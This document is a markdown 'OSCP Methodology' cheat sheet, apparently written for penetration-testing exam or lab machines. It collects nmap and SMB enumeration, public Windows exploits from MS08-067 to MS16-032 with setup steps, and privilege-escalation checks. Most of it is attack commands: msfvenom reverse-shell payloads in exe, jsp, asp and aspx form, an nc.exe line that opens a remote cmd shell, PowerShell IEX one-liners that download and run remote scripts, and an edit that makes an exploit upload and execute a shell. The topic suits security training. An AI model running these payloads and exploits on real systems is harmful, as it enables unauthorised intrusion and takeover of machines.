# oscp_methodology
OSCP Methodology


## Blackbox Enumeration
#### nmap full tcp port scan
##### nmap \<ip> -sV -sC -O -T4 --traceroute -p - -oA ~/path/filename

#### Ftp
* service -> exploit
* banner
* default creds (hydra)
* default creds with nsr (hydra)
* Anonymous login
* Put files
  * if exists web service, check if web and ftp has the same path
* nmap info

#### SSH
* service -> exploit
* banner
* default creds (hydra)
* default creds with nsr (hydra)
* nmap info

#### Samba
* nmap info:
  * OS samba
  * Computer name/NetBIOS name
  * Domain name
  * Workgroup
  * OS of machine

* service (OS samba or nmap service header (139 & 445)) -> exploit
##### nmap -sV -sC --open -T4  -p 139,445 --script=vuln --script-args=unsafe=1 <ip>
* enum4linux
* smbclient
 

## Exploits
### Windows
#### MS08-067
git clone https://github.com/andyacer/ms08_067.git
* configuration
  * pip install impacket
* 2 reverse options for shellcoding:
  * Use the third with 443
  * Use the third with default
  * Use second with default
  * Use second with port of third or another port
* Choose the right option of menu.
  * Find OS of machine
  * Guess lanhuage
* Needs Listener

### Windows
#### MS17-010
git clone https://github.com/worawit/MS17-010.git

##### zzz_exploit.py:
 * If needed USERNAME-"//"
 * next add the following 2 lines to below def smb
   
   smb_send_file(smbConn, '/root/htb/blue/puckieshell443.exe', 'C', '/puckieshell443.exe')
   
   service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
 
* custom payload:
  ##### msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe

* Needs Listener

##### eternalblue_exploit7.py

* use the https://github.com/nickvourd/eternalblue_win7_auto_gen in order to merge binaries nad payload
* Run the following: python MS17-010/eternalblue_exploit7.py <ip> /tmp/sc_x<arch>.bin
* Needs Listener

### Windows
#### MS10-059

* use the https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
* serve the MS10-059.exe to victim
* run exploit: 
  ##### MS10-059.exe \<ip> \<port>
* Need Listener

### Windows
#### MS11-046

* use the https://www.exploit-db.com/exploits/40564
* compile:
  ##### i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 
  
  ###### Installation: apt install mingw-w64
* no need listener (insta run)

### Windows
#### MS15-051

* use the https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
* Check the architecture of victim and choose the right exe
* upload to victim machine
* run the following:
  ###### ms15-051x64.exe "nc.exe 10.10.14.28 4444 -e cmd.exe"
* Needs Listener

### Windows
#### MS16-032

* use https://www.exploit-db.com/exploits/39719
* Edit the file:
  * end of file add this Invoke-MS16-032
  * Inside th file search and find cmd.exe two times.
  * Change with shell.exe in current directory in victim which you are.
  * generate shell.exe:
    ###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=6666 -f exe > shell.exe
  * serve the shell.exe to victim
  * open a listener
  * run the ps1 exploit:
    ##### C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://\<ip>/ms16032.ps1')
  
## Privilege Escalation
### Windows
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  * searchsploit
  * google

* systeminfo
  * Architecture
  * Numbers of Proccessors
  * Domain
  * HotFixes
  * System Locale
  * Input Locale
 
 * Numbers of cores of processors: 
   ##### WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
 
 * Serlock
   * Config: Add to the last line the "Find-AllVulns"
   * Download and run Sherlock:
     ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/Sherlock.ps1') | powershell -noprofile -
 
 * Watson
   * Find .NET latest version of victim:
     ##### dir %windir%\Microsoft.NET\Framework /AD
   * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
   * Build exe to visual studio
   
* PowerUP
   * Config: add to the last line the "Invoke-AllChecks"
   * Download and run PowerUp:
     ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/PowerUp.ps1') | powershell -noprofile -
     
## MSFVENOM
### EXE
##### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f exe > shell.exe

### JSP
##### msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f raw > shell.jsp

### ASP
###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f asp > shell.asp

### ASPX
###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f aspx > shell.aspx
